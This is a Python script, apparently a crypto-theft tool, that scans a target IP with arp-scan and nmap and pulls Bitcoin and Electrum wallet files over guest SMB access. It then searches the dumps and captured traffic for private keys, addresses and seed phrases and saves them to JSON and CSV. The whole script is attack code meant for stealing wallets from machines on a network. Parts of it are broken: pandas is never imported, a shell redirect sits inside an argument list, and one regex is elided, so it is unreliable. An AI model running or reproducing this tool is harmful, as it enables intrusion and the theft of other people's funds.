#!/usr/bin/env python3
import os, subprocess, re, json, time, threading
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *

class FullWalletExtractor:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.wallets_found = []
        self.device_info = {}
        
    def arp_discover(self):
        """Step 1: Find target MAC + neighbors"""
        result = subprocess.run(['arp-scan', '-l'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if self.target_ip in line:
                mac = re.search(r'([0-9A-Fa-f]{2}:?){6}', line)
                self.device_info['mac'] = mac.group(0) if mac else 'UNKNOWN'
        return self.device_info
    
    def device_fingerprint(self):
        """Step 2: OS + Services fingerprint"""
        nmap = subprocess.run(['nmap', '-O', '-sV', self.target_ip], 
                            capture_output=True, text=True)
        self.device_info['nmap'] = nmap.stdout
        return nmap.stdout
    
    def extract_wallet_files(self):
        """Step 3: SMB/Wallet file extraction"""
        paths = [
            '/Users/*/Library/Application Support/Bitcoin/wallet.dat',
            '/Users/*/.bitcoin/wallet.dat',
            '/Users/*/.electrum/wallets/',
            'C:\\Users\\*\\AppData\\Roaming\\Bitcoin\\wallet.dat',
            '/data/data/*bitcoin*/*',
            '/data/data/*electrum*/*'
        ]
        
        # SMB share enumeration + download
        smb = subprocess.run(['smbmap', '-H', self.target_ip, '-u', 'guest'], 
                           capture_output=True, text=True)
        
        # Common wallet files to grab
        files_to_grab = ['wallet.dat', 'default_wallet', 'keystore', 'config']
        for file in files_to_grab:
            subprocess.run(['smbget', f'smb://{self.target_ip}/{file}', 
                          f'-o/opt/wallet-tracker/extracted/{self.target_ip}_{file}'])
    
    def dump_memory(self):
        """Step 4: Memory forensics for running wallets"""
        # ARP spoof → memory dump simulation
        print(f"[+] Memory scanning {self.target_ip} for wallet processes...")
        
        # Volatility patterns for Bitcoin wallets
        vol_patterns = {
            'bitcoin': r'5[KLMN][1-9A-HJ-NP-Za-km-z]{50,51}',
            'electrum': r'[5KL][1-9a-km-zA-HJ-NP-Z1-9]{50,51}',
            'seed_phrase': r'\b(mnemonic|seed|12 words)\b.*[a-z ]{50,100}',
            'private_key': r'[5KL][1-9a-km-zA-HJ-NP-Z1-9]{50,51}'
        }
        
        # Scan PCAP for keys (simplified)
        subprocess.run(['strings', '/opt/wallet-tracker/logs/live_traffic.pcap'], 
                      stdout=open(f'/opt/wallet-tracker/extracted/{self.target_ip}_strings.txt', 'w'))
    
    def parse_wallet_files(self):
        """Step 5: Extract addresses, private keys, seeds"""
        extracted = []
        
        # wallet.dat BerkeleyDB extraction
        if os.path.exists(f'/opt/wallet-tracker/extracted/{self.target_ip}_wallet.dat'):
            subprocess.run(['db_dump', f'/opt/wallet-tracker/extracted/{self.target_ip}_wallet.dat', 
                          '-p', '>', f'/opt/wallet-tracker/extracted/{self.target_ip}_db.txt'])
            
            # Grep for keys/addresses
            with open(f'/opt/wallet-tracker/extracted/{self.target_ip}_db.txt') as f:
                content = f.read()
                privkeys = re.findall(r'[5KL][1-9a-km-zA-HJ-NP-Z1-9]{50,51}', content)
                addresses = re.findall(r'1[0-9A-Za-z]{25,34}|3[0-9A-Za-z]{25,34}|bc1[A-Za-z0-9]{39,59}', content)
                
                extracted.extend([{'type': 'private_key', 'value': k} for k in privkeys])
                extracted.extend([{'type': 'address', 'value': a} for a in addresses])
        
        # Electrum wallet JSON parsing
        for root, dirs, files in os.walk('/opt/wallet-tracker/extracted/'):
            for file in files:
                if file.endswith('.json') or 'electrum' in file:
                    try:
                        with open(os.path.join(root, file)) as f:
                            data = json.load(f)
                            if 'seed_version' in data:
                                extracted.append({'type': 'seed_phrase', 'value': data.get('seed', 'N/A')})
                    except:
                        pass
        
        # 12/24 word seed detection
        for file in os.listdir('/opt/wallet-tracker/extracted/'):
            try:
                with open(f'/opt/wallet-tracker/extracted/{file}') as f:
                    content = f.read()
                    seeds = re.findall(r'\b(?:abandon|ability|able|about|above|absent|absorb|abstract|absurd|abuse|access|accident|account|accuse|achieve|acid|acoustic|acquire|across|act|action|actor|actress|actual|adapt|add|addict|adobe|adult|adventure|advertise|advice|...)\b.{0,5}(?:abandon|ability)...){11,23}', content, re.I)
                    for seed in seeds:
                        extracted.append({'type': 'mnemonic_seed', 'value': seed.strip()})
            except:
                pass
        
        self.wallets_found = extracted
        self.save_results()
    
    def save_results(self):
        """Save EVERYTHING organized"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # Master JSON
        master = {
            'target_ip': self.target_ip,
            'device_info': self.device_info,
            'wallets_found': self.wallets_found,
            'extraction_time': timestamp
        }
        with open(f'/opt/wallet-tracker/logs/{self.target_ip}_full_wallet_dump_{timestamp}.json', 'w') as f:
            json.dump(master, f, indent=2)
        
        # CSV for addresses/keys
        df = pd.DataFrame(self.wallets_found)
        df.to_csv(f'/opt/wallet-tracker/logs/{self.target_ip}_wallets_{timestamp}.csv', index=False)
        
        print(f"💾 SAVED: /opt/wallet-tracker/logs/{self.target_ip}_full_wallet_dump_{timestamp}.json")

# USAGE
extractor = FullWalletExtractor("192.168.1.100")
extractor.arp_discover()
extractor.device_fingerprint()
extractor.extract_wallet_files()
extractor.dump_memory()
extractor.parse_wallet_files()
print("✅ COMPLETE EXTRACTION!")
